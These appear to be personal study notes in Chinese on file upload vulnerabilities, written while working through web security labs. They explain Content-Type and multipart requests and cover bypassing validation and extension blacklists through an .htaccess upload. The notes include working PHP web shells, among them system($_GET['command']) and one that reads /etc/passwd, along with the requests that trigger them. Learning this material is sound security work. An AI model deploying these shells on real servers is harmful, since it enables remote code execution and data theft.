1.文件上传漏洞是指 Web 服务器允许用户将文件上传到其文件系统，而无需充分验证其名称、类型、内容或大小等信息。未能正确实施这些限制可能意味着即使是基本的图像上传功能也可以用来上传任意和潜在危险的文件。这甚至可能包括支持远程代码执行的服务器端脚本文件
##### 2.利用不受限制的文件上传来部署web shell（一种恶意脚本）：
`<?php echo file_get_contents('/home/carlos/secret'); ?>`这个PHP文件用于获取 Carlos 秘密文件内容的脚本
`<?php echo system($_GET['command']); ?>`通用的webshell
`GET /example/exploit.php?command=id HTTP/1.1`此脚本能够通过查询参数传递任意系统命令
可以在burp repeater中更改请求路径以指向要上传的漏洞：`GET /files/avatars/exploit.php HTTP/1.1`
##### 3.利用文件上传的有缺陷的验证
1.Content-type告诉服务器:"我发送的是什么类型的东西"
常见的content-type:
    (1).**`application/x-www-form-urlencoded`**就像"填写表格" - 普通表单数据（姓名、密码等）
    例子：`name=张三&age=20`
    (2).**`multipart/form-data`*- 就像"寄混合包裹" - 可以同时发送文本+文件
    文件上传时必须用这个！
    (3).**`application/json`***- 就像"寄JSON格式的数据包
    例子：`{"name": "张三", "age": 20}`
    (4). **`text/html`** - HTML网页
    (5).**`image/jpeg`** - JPEG图片
    (6). **`application/pdf`** - PDF文件
2.Multipart/Form-Data混合的
文件上传时必须使用这个格式：
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabc123

------WebKitFormBoundaryabc123
Content-Disposition: form-data; name="username"

张三
------WebKitFormBoundaryabc123
Content-Disposition: form-data; name="avatar"; filename="hack.php"
Content-Type: application/php

<?php system('cat /etc/passwd'); ?>
------WebKitFormBoundaryabc123--
在进行通过内容类型限制绕过上传文本webshell实验中：
首先我们需要是我们的上传的文件是可以在“上传处理程序中运行的（post请求中），我们通过修改content-type（多混合）创造了可以读取我们上传文件的环境，然后在到合适的地方get请求下输入路径获得密钥。
##### 4.文件扩展黑名单绕过
在通过扩展黑名单绕过web shell上传的实验中，我们需要上传两个文件
![[Pasted image 20251110222237.png]]
因为服务器黑名单阻止了.php扩展名，直接上传exploit.php会被阻止，所以通过上传.htaccess文件，我们告诉服务器‘请把.133t括展名的文件当PHP脚本来执行
然后我们再上传修改文件名后的恶意文件，再将上传照片的路径改为上传恶意文件的路径，就可以获得密钥啦
